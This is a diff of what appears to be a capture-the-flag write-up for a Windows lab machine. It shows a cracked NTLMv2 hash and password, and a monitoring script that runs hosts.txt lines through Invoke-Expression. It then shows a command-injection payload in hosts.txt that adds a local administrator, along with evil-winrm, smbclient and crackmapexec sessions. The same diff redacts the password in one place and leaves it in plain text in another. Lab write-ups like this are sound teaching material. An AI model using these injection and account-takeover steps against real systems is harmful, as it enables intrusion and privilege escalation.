@@ -430,7 +430,7 @@ Dictionary cache hit:
 * Bytes.....: 139921507
 * Keyspace..: 14344385
 
-BUSE::WINDCORP:4ce69722d0715c4e:d182f429d3f8e1899fe6152a31f04df0:01010000000000004b749f876555d6014350ab75446d0e3a000000000200060053004d0042000100160053004d0042002d0054004f004f004c004b00490054000400120073006d0062002e006c006f00630061006c000300280073006500720076006500720032003000300033002e0073006d0062002e006c006f00630061006c000500120073006d0062002e006c006f00630061006c00080030003000000000000000010000000020000073b171a2270f43dc6457d587e7ed686ba5cb926d2746466aa21e11ff6a99e5a00a00100000000000000000000000000000000000090000000000000000000000:uzunLM+3131
+BUSE::WINDCORP:4ce69722d0715c4e:d182f429d3f8e1899fe6152a31f04df0:01010000000000004b749f876555d6014350ab75446d0e3a000000000200060053004d0042000100160053004d0042002d0054004f004f004c004b00490054000400120073006d0062002e006c006f00630061006c000300280073006500720076006500720032003000300033002e0073006d0062002e006c006f00630061006c000500120073006d0062002e006c006f00630061006c00080030003000000000000000010000000020000073b171a2270f43dc6457d587e7ed686ba5cb926d2746466aa21e11ff6a99e5a00a00100000000000000000000000000000000000090000000000000000000000:<PASSWORD>
                                                  
 Session..........: hashcat
 Status...........: Cracked
@@ -452,7 +452,7 @@ Started: Sun Feb 21 23:41:48 2021
 Stopped: Sun Feb 21 23:42:26 2021
 ```
 
-We get the password `uzunLM+3131`!
+We get the password!
 
 Time to get into the machine. We will use `Evil-WinRM`. (go to the github page for instructions on how to download)
 
@@ -483,6 +483,109 @@ Going way back, we see a directory named `scripts`. That looks odd. Let's check 
 
 (I am reading only through comments.)
 
+```
+*Evil-WinRM* PS C:\scripts> cat checkservers.ps1
+# reset the lists of hosts prior to looping
+$OutageHosts = $Null
+# specify the time you want email notifications resent for hosts that are down
+$EmailTimeOut = 30
+# specify the time you want to cycle through your host lists.
+$SleepTimeOut = 45
+# specify the maximum hosts that can be down before the script is aborted
+$MaxOutageCount = 10
+# specify who gets notified
+$notificationto = "brittanycr@windcorp.thm"
+# specify where the notifications come from
+$notificationfrom = "admin@windcorp.thm"
+# specify the SMTP server
+$smtpserver = "relay.windcorp.thm"
+
+# start looping here
+Do{
+$available = $Null
+$notavailable = $Null
+Write-Host (Get-Date)
+
+# Read the File with the Hosts every cycle, this way to can add/remove hosts
+# from the list without touching the script/scheduled task,
+# also hash/comment (#) out any hosts that are going for maintenance or are down.
+get-content C:\Users\brittanycr\hosts.txt | Where-Object {!($_ -match "#")} |
+ForEach-Object {
+    $p = "Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue"
+    Invoke-Expression $p
+if($p)
+    {
+     # if the Host is available then just write it to the screen
+     write-host "Available host ---> "$_ -BackgroundColor Green -ForegroundColor White
+     [Array]$available += $_
+    }
+else
+    {
+     # If the host is unavailable, give a warning to screen
+     write-host "Unavailable host ------------> "$_ -BackgroundColor Magenta -ForegroundColor White
+     $p = Test-Connection -ComputerName $_ -Count 1 -ea silentlycontinue
+     if(!($p))
+       {
+        # If the host is still unavailable for 4 full pings, write error and send email
+        write-host "Unavailable host ------------> "$_ -BackgroundColor Red -ForegroundColor White
+        [Array]$notavailable += $_
+
+        if ($OutageHosts -ne $Null)
+            {
+                if (!$OutageHosts.ContainsKey($_))
+                {
+                 # First time down add to the list and send email
+                 Write-Host "$_ Is not in the OutageHosts list, first time down"
+                 $OutageHosts.Add($_,(get-date))
+                 $Now = Get-date
+                 $Body = "$_ has not responded for 5 pings at $Now"
+                 Send-MailMessage -Body "$body" -to $notificationto -from $notificationfrom `
+                  -Subject "Host $_ is down" -SmtpServer $smtpserver
+                }
+                else
+                {
+                    # If the host is in the list do nothing for 1 hour and then remove from the list.
+                    Write-Host "$_ Is in the OutageHosts list"
+                    if (((Get-Date) - $OutageHosts.Item($_)).TotalMinutes -gt $EmailTimeOut)
+                    {$OutageHosts.Remove($_)}
+                }
+            }
+        else
+            {
+                # First time down create the list and send email
+                Write-Host "Adding $_ to OutageHosts."
+                $OutageHosts = @{$_=(get-date)}
+                $Body = "$_ has not responded for 5 pings at $Now"
+                Send-MailMessage -Body "$body" -to $notificationto -from $notificationfrom `
+                 -Subject "Host $_ is down" -SmtpServer $smtpserver
+            }
+       }
+    }
+}
+# Report to screen the details
+$log = "Last run: $(Get-Date)"
+write-host $log
+Set-Content -Path C:\scripts\log.txt -Value $log
+Write-Host "Available count:"$available.count
+Write-Host "Not available count:"$notavailable.count
+Write-Host "Not available hosts:"
+$OutageHosts
+Write-Host ""
+Write-Host "Sleeping $SleepTimeOut seconds"
+sleep $SleepTimeOut
+if ($OutageHosts.Count -gt $MaxOutageCount)
+{
+    # If there are more than a certain number of host down in an hour abort the script.
+    $Exit = $True
+    $body = $OutageHosts | Out-String
+    Send-MailMessage -Body "$body" -to $notificationto -from $notificationfrom `
+     -Subject "More than $MaxOutageCount Hosts down, monitoring aborted" -SmtpServer $smtpServer
+}
+}
+while ($Exit -ne $True)
+```
+
+Important:
 ```
 # Read the File with the Hosts every cycle, this way to can add/remove hosts
 # from the list without touching the script/scheduled task,
@@ -577,3 +680,78 @@ cisco.com
 Now, add the commands, and put the file. Easy? my dumbass still can't figure that. 
 
 :(((
+
+Redoing it, since there may be some issues.
+
+===============================================================================
+
+
+Changing brittany's password ... 
+
+```
+❯ evil-winrm -u buse -p uzunLM+3131 -i 10.10.74.141
+
+Evil-WinRM shell v2.3
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\buse\Documents> net user brittanycr ChangeMe#1234
+The command completed successfully.
+```
+
+done.
+
+Uploading the add user script
+
+```
+❯ smbclient //10.10.74.141/Users -U brittanycr --password Change
+Try "help" to get a list of possible commands.
+smb: \> cd brittanycr
+smb: \brittanycr\> ls
+  .                                   D        0  Sat May  2 19:
+  ..                                  D        0  Sat May  2 19:
+  hosts.txt                           A       22  Sun May  3 09:
+get 
+                15587583 blocks of size 4096. 10894588 blocks av
+smb: \brittanycr\> get hosts.txt
+getting file \brittanycr\hosts.txt of size 22 as hosts.txt (0.0 
+smb: \brittanycr\> put hosts.txt
+putting file hosts.txt as \brittanycr\hosts.txt (0.1 kb/s) (average 0.1 kb/s)
+```
+
+```
+❯ cat hosts.txt
+google.com
+cisco.com
+;net user tanishq ChangeMe#1234 /add;net localgroup Administrators tanishq /add
+```
+
+done.
+
+
+
+Trying to logon ... (waiting ...) ...
+
+yeah ... not working.
+
+
+After spending 30 mins on this shit, I have ... finally got it!
+
+I created a new user using buse's account privs and then just put escalation script line in brittany. 
+
+```
+net localgroup Administrators tanishq /add;
+```
+
+```
+❯ crackmapexec smb 10.10.74.141 -u tanishq -p 'ChangeMe#1234'
+SMB         10.10.74.141    445    FIRE             [*] Windows 10.0 Build 17763 x64 (name:FIRE) (domain:windcorp.thm) (signing:True) (SMBv1:False)
+SMB         10.10.74.141    445    FIRE             [+] windcorp.thm\tanishq:ChangeMe#1234 (Pwn3d!)
+```
+
+Hell yeah. 
+
+```
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat Flag3.txt
+THM{PWNED}
+```
